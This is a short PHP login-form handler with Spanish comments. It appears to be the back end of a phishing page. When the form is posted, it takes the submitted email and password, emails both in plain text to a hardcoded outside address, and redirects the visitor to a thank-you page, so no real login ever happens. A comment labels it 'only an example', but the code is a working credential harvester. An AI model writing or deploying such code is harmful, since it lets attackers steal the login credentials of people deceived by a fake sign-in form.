<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"] ?? '';
    $password = $_POST["password"] ?? '';

    // Aquí podrías realizar más validaciones y procesamiento de datos

    // Enviar un correo electrónico con los datos (SOLO COMO EJEMPLO)
    $to = "gmail@regisvaldes31.com";
    $subject = "Nuevo inicio de sesión";
    $message = "Correo electrónico: $email\nContraseña: $password";

    // Enviar el correo (en un entorno real, asegúrate de tener configurado el servidor de correo)
    mail($to, $subject, $message);

    // Redirigir a una página de agradecimiento
    header("Location: gracias.html");
    exit;

}
?>